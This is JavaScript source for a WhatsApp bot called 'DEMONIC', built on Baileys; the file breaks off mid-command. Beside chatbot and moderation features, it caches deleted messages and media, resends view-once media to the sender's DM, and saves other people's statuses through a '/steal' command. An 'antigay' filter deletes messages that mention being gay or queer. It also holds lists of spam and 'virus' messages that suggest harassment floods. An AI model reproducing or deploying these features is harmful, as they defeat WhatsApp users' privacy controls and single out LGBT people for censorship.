/**
 * ============================================
 * 🤖 DEMONIC WhatsApp Bot
 * Version: 1.0.0
 * - Professional Edition
 * - Integrated AI & Media Downloads
 * CREDITS BAN CLAN
 * - File length (2600-3000 lines)
 * ============================================
 */

const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  DisconnectReason,
  downloadContentFromMessage,
  getContentType
} = require("@whiskeysockets/baileys");

const P = require("pino");
const fs = require("fs");
const path = require("path");
const readline = require("readline");
const chalk = require("chalk");
const { menuImage, sendMenuImage } = require("./menupic");
const { sendMenuAudio } = require("./menuaudio");
const crypto = require("crypto");
const axios = require("axios");


const BOT_NAME = "DEMONIC";
const VERSION = "1.0.0";
const GEMINI_API_KEY = "YOUR_GEMINI_API_KEY"; // Get your free key at https://aistudio.google.com
const VIRUSTOTAL_API_KEY = "YOUR_VIRUSTOTAL_API_KEY"; // Get free key at https://www.virustotal.com/gui/join-us

const CONFIG_PATH = path.join(__dirname, "config.json");
let CONFIG = {};
try {
  if (fs.existsSync(CONFIG_PATH)) {
    CONFIG = JSON.parse(fs.readFileSync(CONFIG_PATH, "utf8") || "{}");
  }
} catch (err) {
  console.warn("⚠️ Could not read config.json:", err.message);
}

let OPENAI_API_KEY = process.env.OPENAI_API_KEY || CONFIG.OPENAI_API_KEY || "YOUR_OPENAI_API_KEY"; // Set your OpenAI key in environment or config.json
let RAPIDAPI_KEY = process.env.RAPIDAPI_KEY || CONFIG.RAPIDAPI_KEY || "YOUR_RAPIDAPI_KEY"; // Set your RapidAPI key for YouTube downloader
const RAPIDAPI_HOST = "yt-api.p.rapidapi.com";

const CHANNEL =
  "https://whatsapp.com/channel/0029VbAwbnHHgZWXIuzvtA3j";
const GROUP_LINK =
  "https://chat.whatsapp.com/LGe1xGD82uKFt4PUIfpsGq";

const OWNERS = [
  "2349054345858@s.whatsapp.net",
  "2348104204249@s.whatsapp.net",
  "2347061247283@s.whatsapp.net" // Added User
];

const isOwner = (jid) => {
  if (!jid) return false;
  const cleanJid = jid.replace(/:\d+@/, '@');
  return OWNERS.includes(cleanJid) || OWNERS.includes(jid);
};

let PREFIX = "/";

let PUBLIC = true;

let ANTILINK = false;
let ANTISTICKER = false;
let ANTIGHOST = false;
let ANTIBUG = {};
let ANTICHAT = false;
let ANTICALL = false;
let AUTOTYPING = false;
let AUTORECORDING = false;
let WELCOME = false;
let ANTIBADWORDS = false;
let ANTIGAY = false;
let AUTOREACT = false;
let GROUP_DEFENSE = false; // New Defense Mode

let MESSAGE_STORE = {};
let WARN_STORE = {};
let LAST_SEEN = {};
let SCORE_STORE = {};
let BUG_STORE = {};
let AFK_STORE = {};
let EMOJI_REACTIONS = {};

let RESTARTING = false;
let LAST_RESTART = 0;
const RESTART_DELAY = 5000;

const LINK_REGEX =
  /(?:https?:\/\/)?(?:www\.)?(?:chat\.whatsapp\.com\/|wa\.me\/|whatsapp\.com\/|t\.me\/|bit\.ly\/|tinyurl\.com\/|discord\.gg\/|facebook\.com\/|fb\.me\/|instagram\.com\/|youtube\.com\/)/i;

const BAD_WORDS = [
  "fuck", "shit", "damn", "hell", "crap", "ass", "bitch", "bastard",
  "cock", "pussy", "dick", "boobs", "sex", "porn", "rape", "kill yourself",
  "kys", "nigga", "nigger", "faggot", "slut", "whore", "retard", "Die", "madness", "werey"
];

const GAY_KEYWORDS = [
  "babe", "guy", "u be gay", "you gay", "gay", "homo", "queer",
  "i'm gay", "im gay", "being gay", "proud gay", "Werey"
];

const checkBadWords = (text) => {
  const lowerText = text.toLowerCase();
  return BAD_WORDS.some(word => lowerText.includes(word));
};

const checkGayKeywords = (text) => {
  const lowerText = text.toLowerCase();
  return GAY_KEYWORDS.some(word => lowerText.includes(word));
};

const BUG_MESSAGES = [
  "🪲 bzzzzzzzz 🪲",
  "🐛 annoying buzzing sounds 🐛",
  "buzz buzz buzz buzz 🪲",
  "🪲 BZZZZZZZZZZZZ 🪲",
  "I'm bugging you! 🐛 Stop ignoring me!",
  "🪲 bzz bzz bzz bzz 🪲",
  "Did you feel that? I'm literally bugging you! 🪲",
  "BUZZZZZZ I won't stop! 🪲",
  "🐛 Annoying right? That's my job! 🐛",
  "🪲 bzzzzzzzzzzzzzz 🪲",
  "🦟 INFECTED 🦟",
  "🕷️ WEBBED 🕷️",
  "🦗 CHIRPING 🦗",
  "🪲 MULTIPLYING 🪲",
  "🐁 GNAWING 🐁"
];

const DEADLY_MESSAGES = [
  "💀 YOU'RE DEAD 💀",
  "🔥 SYSTEM OVERLOAD 🔥",
  "⚡ CRASH INCOMING ⚡",
  "💣 BOOM! 💣",
  "🚀 SPAM INCOMING 🚀",
  "🌪️ TORNADO ATTACK 🌪️",
  "⚫ VOID SUMMONED ⚫",
  "💥 EXPLOSION 💥",
  "🔴 RED ALERT 🔴",
  "☠️ DEATH INCOMING ☠️",
  "🎭 CHAOS MODE ON 🎭",
  "⚔️ BATTLE STATIONS ⚔️",
  "🌀 VORTEX ACTIVATED 🌀",
  "🔗 CHAIN REACTION 🔗",
  "💻 SYSTEM BREACH 💻",
  "🔓 FIREWALL DOWN 🔓",
  "⚙️ OVERCLOCKED ⚙️",
  "📡 SIGNAL JAMMED 📡",
  "🛸 UFO SPOTTED 🛸",
  "👾 ALIENS ATTACK 👾",
  "🌋 VOLCANIC ERUPTION 🌋",
  "🧬 MUTATED 🧬",
  "🔬 TOXINS RELEASED 🔬"
];

const OVERDEADLY_MESSAGES = [
  "💀💀💀DEMONIC OVERDEADLY ACTIVATED 💀💀💀",
  "☠️ GAME OVER ☠️",
  "🔥🔥🔥 ULTIMATE DESTRUCTION 🔥🔥🔥",
  "⚡⚡⚡ MAXIMUM CHAOS ⚡⚡⚡",
  "💣💣💣 NUCLEAR EXPLOSION 💣💣💣",
  "🌋 VOLCANO ERUPTION 🌋",
  "🪐 PLANET DESTROYED 🪐",
  "⭐ SUPERNOVA 🌟",
  "🌊 TSUNAMI 🌊",
  "❄️ ICE AGE ❄️",
  "🌩️ LIGHTNING STORM 🌩️",
  "🪦 FINAL JUDGMENT 🪦",
  "🎆 APOCALYPSE 🎆",
  "👹 DEMON UNLEASHED 👹"
];

const OVERLOAD_MESSAGES = [
  "💥💥💥 OVERLOAD INITIATED 💥💥💥",
  "🌐 SYSTEM FAILURE 🌐",
  "⚙️ CRITICAL ERROR ⚙️",
  "🔴 RED ALERT 🔴",
  "📡 SIGNAL OVERLOAD 📡",
  "⚡ POWER SURGE ⚡",
  "🔥 BURNING SYSTEMS 🔥",
  "💻 CPU MELTDOWN 💻",
  "📊 RAM CRASH 📊",
  "🎮 GAME OVER 🎮",
  "☠️ SYSTEM DEAD ☠️",
  "🚀 LAUNCH NUCLEAR 🚀",
  "🌟 EXTINCTION EVENT 🌟",
  "🏚️ COMPLETE ANNIHILATION 🏚️"
];

const VIRUS_MESSAGES = [
  "💀 *VIRUS DETECTED* 💀",
  "🦠 MALWARE INSTALLED 🦠",
  "🔓 FIREWALL BREACHED 🔓",
  "💾 DATA CORRUPTED 💾",
  "📴 SHUTTING DOWN 📴",
  "⚠️ CRITICAL INFECTION ⚠️",
  "🌑 SYSTEM BLACKOUT 🌑",
  "🔐 SECURITY FAILURE 🔐",
  "⛔ ACCESS DENIED ⛔",
  "🧬 DNA INFECTED 🧬",
  "☢️ RADIATION DETECTED ☢️",
  "💣 DETONATION SEQUENCE 💣",
  "🚨 EMERGENCY SHUTDOWN 🚨",
  "🔱 DESTRUCTION PROTOCOL 🔱",
  "👁️ ALL-SEEING EYE 👁️",
  "💀 YOUR DEVICE IS DEAD 💀"
];

const OVERKILL_MESSAGES = [
  "💯 *OVERKILL ACTIVATED* 💯",
  "🌫️ REALITY COLLAPSE 🌫️",
  "🚀 WARP SPEED ATTACK 🚀",
  "🦠 QUANTUM CORRUPTION 🦠",
  "🌌 DIMENSIONAL BREACH 🌌",
  "💯 INFINITE SPAM 💯",
  "💣 THERMONUCLEAR 💣",
  "🌑 SINGULARITY 🌑",
  "🧰 MEMORY OVERFLOW 🧰",
  "🚀 HYPERDRIVE ENGAGED 🚀",
  "💥 BIG BANG RESETS 💥",
  "🔐 UNBREAKABLE ENCRYPTION 🔐",
  "💀 PERMANENT DELETION 💀",
  "🌠 CHAOS ENTITY 🌠",
  "💯 TRANSCENDENCE REACHED 💯",
  "🔱 DOOMSDAY PROTOCOL 🔱"
];

const getFunJoke = async () => {
  try {
    const response = await axios.get("https://v2.jokeapi.dev/joke/Any?type=single");
    return `😂 ${response.data.joke}`;
  } catch (error) {
    try {
      const response = await axios.get("https://official-joke-api.appspot.com/random_joke");
      return `😂 ${response.data.setup}\n${response.data.punchline}`;
    } catch {
      return "😂 Why do programmers prefer dark mode? Because light attracts bugs!";
    }
  }
};

const getTruthQuestion = async () => {
  try {
    const response = await axios.get("https://api.adviceslip.com/advice");
    const advice = response.data.slip?.advice || "What's your biggest goal?";
    return `🤔 ${advice}`;
  } catch (error) {
    try {
      const response = await axios.get("https://uselessfacts.jsoup.com/random.json");
      return `🤔 Did you know? ${response.data.text}`;
    } catch {
      return "🤔 What's your biggest fear?";
    }
  }
};

const getDareChallenge = async () => {
  try {
    const challenges = [
      "Make a funny face at the camera 📸",
      "Send a voice note singing your favorite song 🎤",
      "React to a sad message with happy emoji 😂",
      "Send a meme to the last person in your contacts",
      "Change your profile name to something silly",
      "Send a sticker to everyone in the chat 🎪",
      "Tell a joke to the group 😄",
      "Draw something with your phone 🎨"
    ];
    const randomChallenge = challenges[Math.floor(Math.random() * challenges.length)];
    return `🔥 ${randomChallenge}`;
  } catch (error) {
    return "🔥 Dare: Send a funny sticker to the group!";
  }
};

const CHATBOT_STATE = {}; // keyed by chat JID to provider number: 1, 2, 3, or 4

const CHATBOT_LABELS = {
  1: "OpenAI GPT",
  2: "OpenAI GPT (AffiliatePlus fallback)",
  3: "OpenAI GPT (Simsimi fallback)",
  4: "OpenAI GPT (Demonic Guide)"
};

const getOpenAIChatReply = async (prompt, systemPrompt = "You are DEMONIC, a fun and helpful WhatsApp chatbot.") => {
  if (!OPENAI_API_KEY || OPENAI_API_KEY === "YOUR_OPENAI_API_KEY") {
    throw new Error("OpenAI API key is missing. Set OPENAI_API_KEY in environment variables.");
  }

  const response = await axios.post(
    "https://api.openai.com/v1/chat/completions",
    {
      model: "gpt-3.5-turbo",
      messages: [
        { role: "system", content: systemPrompt },
        { role: "user", content: prompt }
      ],
      temperature: 0.8,
      max_tokens: 500
    },
    {
      headers: {
        Authorization: `Bearer ${OPENAI_API_KEY}`,
        "Content-Type": "application/json"
      }
    }
  );

  return response.data?.choices?.[0]?.message?.content?.trim() || "I couldn't generate a response.";
};

const getChatbot1Reply = async (prompt) => {
  return getOpenAIChatReply(prompt, "You are DEMONIC, a fun and helpful WhatsApp chatbot.");
};

const getChatbot2Reply = async (prompt) => {
  return getOpenAIChatReply(prompt, "You are a friendly chatbot that replies in the style of AffiliatePlus. Keep answers concise, helpful, and polite.");
};

const getChatbot3Reply = async (prompt) => {
  return getOpenAIChatReply(prompt, "You are a playful chatbot that replies in the style of Simsimi. Keep the answer lighthearted, chatty, and engaging.");
};

const getChatbot4Reply = async (prompt) => {
  return getOpenAIChatReply(prompt, "You are a wise and helpful assistant with a friendly, guiding tone. Answer clearly, support the user, and provide concise advice.");
};

const getChatbotReply = async (provider, prompt) => {
  switch (provider) {
    case "1":
      return getChatbot1Reply(prompt);
    case "2":
      return getChatbot2Reply(prompt);
    case "3":
      return getChatbot3Reply(prompt);
    case "4":
      return getChatbot4Reply(prompt);
    default:
      throw new Error("Unknown chatbot provider.");
  }
};

let isStarting = false;

async function startBot() {
  if (isStarting) return;
  isStarting = true;

  try {
    const { state, saveCreds } = await useMultiFileAuthState("./session");

    console.log(chalk.cyan.bold("\n╔════════════════════════════════════╗"));
    console.log(chalk.cyan.bold("║     🤖 DEMONIC BOT STARTING        ║"));
    console.log(chalk.cyan.bold("╚════════════════════════════════════╝\n"));

    const { version, isLatest } = await fetchLatestBaileysVersion().catch(() => ({ version: "6.7.0", isLatest: true }));
    console.log(chalk.blue(`📡 Using Baileys v${version} (Latest: ${isLatest})`));

    const sock = makeWASocket({
      auth: state,
      version,
      logger: P({ level: "silent" }),
      printQRInTerminal: false,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      keepAliveIntervalMs: 10000,
      emitOwnEvents: true,
      fireInitQueries: true,
      generateHighQualityLinkPreview: true,
      syncFullHistory: true,
      markOnlineOnConnect: true
    });

    sock.ev.on("creds.update", saveCreds);

    const waitForSocketConnection = () => new Promise((resolve) => {
      let resolved = false;
      const handler = (update) => {
        if (["open", "connecting"].includes(update.connection)) {
          if (!resolved) {
            resolved = true;
            sock.ev.off("connection.update", handler);
            resolve();
          }
        }
      };

      sock.ev.on("connection.update", handler);
      setTimeout(() => {
        if (!resolved) {
          resolved = true;
          sock.ev.off("connection.update", handler);
          resolve();
        }
      }, 30000);
    });

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "connecting") {
        console.log(chalk.yellow.bold("⏳ Connecting to WhatsApp..."));
      }

      if (connection === "open") {
        isStarting = false;
        
        // Professional Feature: Auto Bio Status Updater
        setInterval(async () => {
          try {
            const uptime = process.uptime();
            const days = Math.floor(uptime / (3600 * 24));
            const hours = Math.floor((uptime % (3600 * 24)) / 3600);
            const minutes = Math.floor((uptime % 3600) / 60);
            const status = `🤖 DEMONIC v${VERSION} | 🟢 Online | ⏱️ Uptime: ${days}d ${hours}h ${minutes}m`;
            await sock.updateProfileStatus(status);
          } catch (e) {
            // ignore if unsupported by the account
          }
        }, 300000); // Updates every 5 minutes

        console.log(chalk.green.bold.bgGreen.black(`\n✅ ${BOT_NAME} v${VERSION} IS NOW ONLINE!\n`));
        console.log(chalk.blue.bold(`📊 Bot Features Enabled:`));
        console.log(chalk.blue(`   • Prefix: ${PREFIX}`));
        console.log(chalk.blue(`   • Public Mode: ${PUBLIC}`));
        console.log(chalk.blue(`   • Anti-Link: ${ANTILINK}`));
        console.log(chalk.blue(`   • Anti-Bug: ${Object.keys(ANTIBUG).length > 0}`));
        console.log(chalk.blue(`   • Welcome System: ${WELCOME}\n`));
      }

      if (update.connection === "close") {
        const reason = lastDisconnect?.error?.output?.statusCode;
        const errorMessage = lastDisconnect?.error?.message || "Unknown reason";

        isStarting = false;

        console.log(chalk.red.bold(`❌ DISCONNECTED: ${errorMessage} (Reason Code: ${reason})`));

        if (reason === DisconnectReason.loggedOut) {
          console.log(chalk.red.bold("🚪 Logged out. Please clear session folder and re-scan/re-pair."));
          // Only exit if truly logged out
          process.exit(1);
        } else {
          // For ALL other reasons, RECONNECT.
          console.log(chalk.yellow.bold(`🔄 Reconnecting automatically in 3 seconds... (Reason: ${reason || 'Unknown'})`));
          setTimeout(() => startBot(), 3000);
        }
      }
    });

    // ========== PAIRING LOGIC FROM FILE.JS ==========
    if (!state.creds.registered) {
      console.log(chalk.magenta.bold("\n╔════════════════════════════════════╗"));
      console.log(chalk.magenta.bold("║   📲 PAIRING SYSTEM INITIALIZED    ║"));
      console.log(chalk.magenta.bold("╚════════════════════════════════════╝\n"));

      const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
      });

      const askNumber = () => {
        rl.question(chalk.yellow.bold("📱 Send your WhatsApp number with country code\nExample: 2348012345678\n\nNumber: "), async (phoneNumber) => {
          const cleanNumber = phoneNumber.trim().replace(/[^0-9]/g, "");

          if (!/^\d{10,15}$/.test(cleanNumber)) {
            console.log(chalk.red.bold("\n❌ Invalid number format. Please try again."));
            askNumber();
            return;
          }

          let retryCount = 0;
          const maxRetries = 3;

          const requestWithRetry = async () => {
            try {
              console.log(chalk.cyan.bold(`\n⏳ GENERATING YOUR CODE (Attempt ${retryCount + 1}/${maxRetries})...`));

              console.log(chalk.yellow("⏳ Waiting for WhatsApp connection before generating code..."));
              await waitForSocketConnection();

              const code = await sock.requestPairingCode(cleanNumber);
              rl.close();

              console.log(chalk.green.bold("\n✅ PAIRING CODE GENERATED"));
              console.log(`\n      ${chalk.black.bgGreen(" " + code + " ")} \n`);
              console.log(chalk.cyan("Open WhatsApp → Settings → Linked Devices → Link with code"));
              console.log(chalk.cyan("Enter the code above on your phone.\n"));
              return true;
            } catch (err) {
              console.log(chalk.red.bold(`\n❌ Attempt ${retryCount + 1} failed: ${err.message}`));
              retryCount++;
              if (retryCount < maxRetries) {
                console.log(chalk.yellow("Retrying in 5 seconds..."));
                await new Promise(resolve => setTimeout(resolve, 5000));
                return requestWithRetry();
              } else {
                console.log(chalk.red.bold("\n❌ All attempts failed. Please restart the bot or check your connection."));
                askNumber();
              }
            }
          };

          await requestWithRetry();
        });
      };

      askNumber();
    }

    // keep DEMONIC BOT ALIVE 
    setInterval(async () => {
      try {
        await sock.sendPresenceUpdate('available');
      } catch (e) {
        // failed to send presence update, likely disconnected
      }
    }, 30000);
    sock.ev.on("call", async (calls) => {
      if (!ANTICALL) return;
      for (const call of calls) {
        await sock.rejectCall(call.id, call.from);
        await sock.sendMessage(call.from, {
          text: "🚫 Calls are not allowed on this bot."
        });
      }
    });





    sock.ev.on("group-participants.update", async (update) => {
      if (!WELCOME) return;

      if (update.action === "add") {
        for (const user of update.participants) {
          await sock.sendMessage(update.id, {
            text: `👋 Welcome @${user.split("@")[0]} to the group!`,
            mentions: [user]
          });
        }
      }

      if (update.action === "remove") {
        for (const user of update.participants) {
          await sock.sendMessage(update.id, {
            text: `👋 @${user.split("@")[0]} has left the group.`,
            mentions: [user]
          });
        }
      }
    });





    sock.ev.on("messages.upsert", async ({ messages }) => {
      try {
        const m = messages[0];
        if (!m.message) return;


        const unwrapMessage = (msg) => {
          if (!msg) return null;
          if (msg.ephemeralMessage) return unwrapMessage(msg.ephemeralMessage.message);
          if (msg.viewOnceMessage) return unwrapMessage(msg.viewOnceMessage.message);
          if (msg.viewOnceMessageV2) return unwrapMessage(msg.viewOnceMessageV2.message);
          return msg;
        };

        const msg = unwrapMessage(m.message);

        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const sender = m.key.participant || from;
        const senderName = m.pushName || sender.split("@")[0];

        const body =
          msg.conversation ||
          msg.extendedTextMessage?.text ||
          msg.imageMessage?.caption ||
          msg.videoMessage?.caption ||
          "";

        const mediaType = getContentType(msg);
        let mediaData = null;

        if (["imageMessage", "videoMessage", "stickerMessage", "audioMessage", "documentMessage"].includes(mediaType)) {
          try {
            const mediaMsg = msg[mediaType];
            const stream = await downloadContentFromMessage(mediaMsg, mediaType.replace("Message", ""));
            let buffer = Buffer.from([]);
            for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
            mediaData = {
              type: mediaType,
              buffer,
              mimetype: mediaMsg.mimetype ||
                (mediaType === "imageMessage" ? "image/jpeg" :
                 mediaType === "videoMessage" ? "video/mp4" :
                 mediaType === "audioMessage" ? "audio/mpeg" :
                 mediaType === "documentMessage" ? "application/octet-stream" :
                 "application/octet-stream"),
              caption: mediaMsg.caption || body || "",
              fileName: mediaMsg.fileName || null,
              ptt: mediaType === "audioMessage" ? !!mediaMsg.ptt : false
            };
          } catch (err) {
            console.error("⚠️ Failed to cache deleted media:", err?.message || err);
          }
        }

        LAST_SEEN[sender] = Date.now();
        MESSAGE_STORE[m.key.id] = { body, sender, from, media: mediaData };


        const timestamp = new Date().toLocaleTimeString();
        const chatType = isGroup ? chalk.magenta("GROUP") : chalk.cyan("PRIVATE");

        if (body && body.startsWith(PREFIX)) {
          console.log(chalk.green.bold(`\n[${timestamp}] ${chatType} ${chalk.yellow.bold(senderName)}: ${chalk.cyan(body)}\n`));
        } else if (body) {
          console.log(chalk.blue(`[${timestamp}] ${chatType} ${chalk.white.bold(senderName)}: ${chalk.white(body.substring(0, 60))}`));
        }

        // AFK CHECK - If sender is AFK, remove them
        if (AFK_STORE[sender]) {
          const afkDuration = Date.now() - AFK_STORE[sender].startTime;
          const durationStr = `${Math.floor(afkDuration / 1000)}s`;
          delete AFK_STORE[sender];
          await sock.sendMessage(from, { text: `👋 Welcome back @${sender.split("@")[0]}! You were AFK for ${durationStr}.`, mentions: [sender] });
        }

        // AFK MENTION CHECK - If mentioned user is AFK, notify sender
        const mentionedJids = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
        for (const jid of mentionedJids) {
          if (AFK_STORE[jid]) {
            const reason = AFK_STORE[jid].reason;
            const time = Math.floor((Date.now() - AFK_STORE[jid].startTime) / 60000);
            await sock.sendMessage(from, {
              text: `🤫 Shh! @${jid.split("@")[0]} is AFK.\nReason: ${reason}\nTime: ${time} mins ago`,
              mentions: [jid]
            }, { quoted: m });
          }
        }


        if (
          isGroup &&
          ANTICHAT &&
          !isOwner(sender) &&
          body &&
          !body.startsWith("/")
        ) {
          await sock.sendMessage(from, {
            delete: {
              remoteJid: from,
              fromMe: false,
              id: m.key.id,
              participant: sender
            }
          });

          return;
        }




        const quotedMessage = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
          msg.imageMessage?.contextInfo?.quotedMessage ||
          msg.videoMessage?.contextInfo?.quotedMessage;
        if (quotedMessage && !["/vv", "/vv1", "/vv2", "/vv3"].includes(body.toLowerCase())) {
          const viewOnce =
            quotedMessage?.viewOnceMessageV2 ||
            quotedMessage?.viewOnceMessage ||
            quotedMessage?.viewOnceMessageV2Extension;

          if (viewOnce && viewOnce.message) {
            try {
              // Send the view-once media to user's personal DM
              await sock.sendMessage(sender, viewOnce.message);

              // Send confirmation in the chat/group
              await sock.sendMessage(from, {
                text: `✅ View-once media sent to your DM! 📨`
              });
              return;
            } catch (error) {
              console.error("Error sending view-once media:", error);
            }
          }
        }

        if (!PUBLIC && !isOwner(sender)) return;

        if (AUTOTYPING || AUTORECORDING) {
          let recOrType;
          if (AUTORECORDING) {
            recOrType = "recording";
          } else if (AUTOTYPING) {
            recOrType = "composing";
          }

          if (recOrType) {
            await sock.sendPresenceUpdate(recOrType, from);
          }
        }



        if (AUTOREACT) {
          const reactionEmojis = [
            "❤️", "🔥", "😂", "👍", "🥺", "😍", "🤣", "✨", "🙏", "⚡",
            "🎉", "💡", "😭", "🤯", "🤔", "🫣", "🫡", "🤝", "💪", "💀",
            "💩", "🤡", "👻", "👀", "🧠", "🦷", "🦴", "👀", "👁️", "🫦",
            "🍕", "🍔", "🍟", "🌭", "🍿", "🧂", "🥓", "🥚", "🍳", "🧇",
            "🚗", "🚕", "🚙", "🚌", "🚎", "🏎️", "🚓", "🚑", "🚒", "🚐",
            "😀", "😃", "😄", "😁", "😆", "😅", "😂", "🤣", "🥲", "🥹"
          ];

          const randomEmoji = reactionEmojis[Math.floor(Math.random() * reactionEmojis.length)];

          try {
            await sock.sendMessage(from, {
              react: {
                text: randomEmoji,
                key: m.key
              }
            });
          } catch (error) {
            console.error("Failed to autoreact:", error);
          }
        }

        const isFromBot = m.key.fromMe === true;
        if (!body.startsWith(PREFIX) && !isFromBot && CHATBOT_STATE[from]) {
          try {
            const chatbotProvider = CHATBOT_STATE[from];
            const chatbotReply = await getChatbotReply(chatbotProvider, body);
            return await sock.sendMessage(from, {
              text: `🤖 [CHATBOT${chatbotProvider}] ${chatbotReply}`
            });
          } catch (error) {
            console.error("Chatbot error:", error);
            return await sock.sendMessage(from, {
              text: `❌ Chatbot error: ${error.message}`
            });
          }
        }

        const cmd = body.trim().toLowerCase();



        if (isGroup && ANTICHAT && !isOwner(sender) && !cmd.startsWith("/")) {
          return;
        }




        if (isGroup && ANTILINK && LINK_REGEX.test(body) && !isOwner(sender)) {
          await sock.sendMessage(from, {
            delete: {
              remoteJid: from,
              fromMe: false,
              id: m.key.id,
              participant: sender
            }
          });

          return sock.sendMessage(from, {
            text: `🚫 @${sender.split("@")[0]} links are not allowed.`,
            mentions: [sender]
          });
        }


        if (isGroup && ANTIBADWORDS && checkBadWords(body) && !isOwner(sender)) {
          await sock.sendMessage(from, {
            delete: {
              remoteJid: from,
              fromMe: false,
              id: m.key.id,
              participant: sender
            }
          });

          return sock.sendMessage(from, {
            text: `🚫 @${sender.split("@")[0]} using bad words is not allowed here!`,
            mentions: [sender]
          });
        }


        if (isGroup && ANTIGAY && checkGayKeywords(body) && !isOwner(sender)) {
          await sock.sendMessage(from, {
            delete: {
              remoteJid: from,
              fromMe: false,
              id: m.key.id,
              participant: sender
            }
          });

          return sock.sendMessage(from, {
            text: `🚫 @${sender.split("@")[0]} that language is not allowed in this group!`,
            mentions: [sender]
          });
        }


        if (isGroup && GROUP_DEFENSE && !isOwner(sender)) {

          const isDocument = msg.documentMessage;
          if (isDocument) {
            const fileName = isDocument.fileName || "";
            const mimeType = isDocument.mimetype || "";
            if (fileName.endsWith(".apk") || mimeType.includes("application/vnd.android.package-archive")) {
              await sock.sendMessage(from, { delete: m.key });
              return sock.sendMessage(from, { text: `🛡️ @${sender.split("@")[0]} APK files are not allowed!`, mentions: [sender] });
            }
          }



          if (body.length > 5000 || /[\u200e\u200f\u202a-\u202e]/.test(body)) {
            await sock.sendMessage(from, { delete: m.key });
            return sock.sendMessage(from, { text: `🛡️ ⛔ Malicious code detected! User warn.` });
          }
        }

        if (cmd === "/status") {
          const now = new Date();
          const time = now.toLocaleTimeString([], {
            hour: "2-digit",
            minute: "2-digit"
          });

          return sock.sendMessage(from, {
            text: `🤖 *DEMONIC STATUS*

⏰ Time: ${time}

🌐 Mode: ${PUBLIC ? "🟢 PUBLIC" : "🔴 PRIVATE"}

🔗 Antilink: ${ANTILINK ? "✅ ON" : "❌ OFF"}
🖼️ Antisticker: ${ANTISTICKER ? "✅ ON" : "❌ OFF"}
👻 Antighost: ${ANTIGHOST ? "✅ ON" : "❌ OFF"}
💬 Antichat: ${ANTICHAT ? "✅ ON" : "❌ OFF"}
📞 Anticall: ${ANTICALL ? "✅ ON" : "❌ OFF"}
🔞 Antibadwords: ${ANTIBADWORDS ? "✅ ON" : "❌ OFF"}
🚫 Antigay: ${ANTIGAY ? "✅ ON" : "❌ OFF"}
🎙️ Autorecording: ${AUTORECORDING ? "✅ ON" : "❌ OFF"}
⌨️ Autotyping: ${AUTOTYPING ? "✅ ON" : "❌ OFF"}
❤️ Autoreact: ${AUTOREACT ? "✅ ON" : "❌ OFF"}
🛡️ Group Defense: ${GROUP_DEFENSE ? "✅ ON" : "❌ OFF"}
👋 Welcome: ${WELCOME ? "✅ ON" : "❌ OFF"}`
          });
        }




        if (cmd === "/steal") {
          try {
            const contextInfo = msg.extendedTextMessage?.contextInfo;
            if (!contextInfo || !contextInfo.quotedMessage) {
              return sock.sendMessage(from, { text: "❌ Reply to a status/story to steal it!" });
            }
            
            const q = contextInfo.quotedMessage;
            // A status update has remoteJid "status@broadcast"
            const isStatus = contextInfo.remoteJid === "status@broadcast";
            
            if (!isStatus) {
                return sock.sendMessage(from, { text: "❌ You must reply directly to a status update!" });
            }

            const type = q.imageMessage ? "imageMessage" : q.videoMessage ? "videoMessage" : null;
            if (!type) {
              return sock.sendMessage(from, { text: "❌ Media not supported. Can only steal image or video statuses." });
            }

            await sock.sendMessage(from, { text: "⏳ Stealing status..." });

            const stream = await downloadContentFromMessage(q[type], type.replace("Message", ""));
            let buffer = Buffer.from([]);
            for await (const c of stream) buffer = Buffer.concat([buffer, c]);

            // Resend the stolen media back to the user
            if (type === "imageMessage") {
              return sock.sendMessage(from, { image: buffer, caption: "🥷 *STATUS STOLEN BY DEMONIC*" });
            } else if (type === "videoMessage") {
              return sock.sendMessage(from, { video: buffer, caption: "🥷 *STATUS STOLEN BY DEMONIC*" });
            }
          } catch (error) {
            console.error("Error in /steal:", error);
            return sock.sendMessage(from, { text: `❌ Failed to steal status: ${error.message}` });
          }
        }
        
        if (cmd === "/tosticker" || cmd.startsWith("/tosticker ")) {
          if (cmd.startsWith("/tosticker2")) return; // let the other command handle it
          try {
            const q = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
              msg.imageMessage?.contextInfo?.quotedMessage ||
              msg.videoMessage?.contextInfo?.quotedMessage;
            if (!q) return sock.sendMessage(from, { text: "❌ Reply to an image or video" });

            const type = q.imageMessage ? "imageMessage" : q.videoMessage ? "videoMessage" : null;
            if (!type)
              return sock.sendMessage(from, { text: "❌ Media not supported. Reply to an image or video." });

            const stream = await downloadContentFromMessage(
              q[type],
              type.replace("Message", "")
            );

            let buffer = Buffer.from([]);
            for await (const c of stream) buffer = Buffer.concat([buffer, c]);

            return sock.sendMessage(from, { sticker: buffer, packname: "DEMONIC", author: "Bot" });
          } catch (error) {
            console.error("Error in /tosticker:", error);
            return sock.sendMessage(from, { text: `❌ Failed to convert to sticker: ${error.message}` });
          }
        }


        if (cmd === "/tosticker2" || cmd.startsWith("/tosticker2 ")) {
          try {
            const q = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
              msg.imageMessage?.contextInfo?.quotedMessage ||
              msg.videoMessage?.contextInfo?.quotedMessage;
            if (!q) return sock.sendMessage(from, { text: "❌ Reply to an image or video" });

            const type = q.imageMessage ? "imageMessage" : q.videoMessage ? "videoMessage" : null;
            if (!type)
              return sock.sendMessage(from, { text: "❌ Media not supported. Reply to an image or video." });

            await sock.sendMessage(from, { text: "⏳ Converting to sticker..." });

            const stream = await downloadContentFromMessage(
              q[type],
              type.replace("Message", "")
            );

            let buffer = Buffer.from([]);
            for await (const c of stream) buffer = Buffer.concat([buffer, c]);

            return sock.sendMessage(from, {
              sticker: buffer,
              packname: "DEMONIC",
              author: "Bot"
            });
          } catch (error) {
            console.error("Error in /tosticker2:", error);
            return sock.sendMessage(from, { text: `❌ Failed to convert to sticker: ${error.message}` });
          }
        }


        if (cmd === "/toimage") {
          try {
            const q = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
